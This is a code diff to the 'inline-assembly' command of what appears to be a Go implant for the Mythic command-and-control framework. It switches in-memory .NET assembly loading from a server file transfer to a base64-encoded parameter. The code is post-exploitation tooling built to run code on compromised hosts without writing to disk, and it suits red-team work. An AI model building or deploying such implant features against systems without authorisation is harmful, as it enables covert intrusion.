@@ -29,6 +29,7 @@
 package commands
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"runtime"
@@ -61,8 +62,8 @@ func (c *InlineAssemblyCommand) Description() string {
 
 // InlineAssemblyParams represents the parameters for inline-assembly
 type InlineAssemblyParams struct {
-	FileID    string `json:"file_id"`
-	Arguments string `json:"arguments"`
+	AssemblyB64 string `json:"assembly_b64"` // Base64-encoded assembly bytes
+	Arguments   string `json:"arguments"`
 }
 
 // Execute executes the inline-assembly command
@@ -87,41 +88,28 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 	}
 
-	// Validate file_id
-	if params.FileID == "" {
+	// Validate assembly_b64
+	if params.AssemblyB64 == "" {
 		return structs.CommandResult{
-			Output:    "Error: No assembly file specified",
+			Output:    "Error: No assembly data provided",
 			Status:    "error",
 			Completed: true,
 		}
 	}
 
-	// Set up file transfer request to get assembly from Mythic
-	getFileMsg := structs.GetFileFromMythicStruct{
-		Task:                  &task,
-		FileID:                params.FileID,
-		FullPath:              "", // Not writing to disk - in-memory only
-		SendUserStatusUpdates: false,
-		ReceivedChunkChannel:  make(chan []byte, 100),
-	}
-
-	// Send the file transfer request
-	task.Job.GetFileFromMythic <- getFileMsg
-
-	// Collect all chunks into a byte slice
-	var assemblyBytes []byte
-	totalBytesReceived := 0
-	for chunk := range getFileMsg.ReceivedChunkChannel {
-		if chunk == nil || len(chunk) == 0 {
-			break
+	// Decode the base64-encoded assembly
+	assemblyBytes, err := base64.StdEncoding.DecodeString(params.AssemblyB64)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error decoding assembly: %v", err),
+			Status:    "error",
+			Completed: true,
 		}
-		assemblyBytes = append(assemblyBytes, chunk...)
-		totalBytesReceived += len(chunk)
 	}
 
 	if len(assemblyBytes) == 0 {
 		return structs.CommandResult{
-			Output:    "Error: No assembly data received from Mythic",
+			Output:    "Error: Assembly data is empty",
 			Status:    "error",
 			Completed: true,
 		}
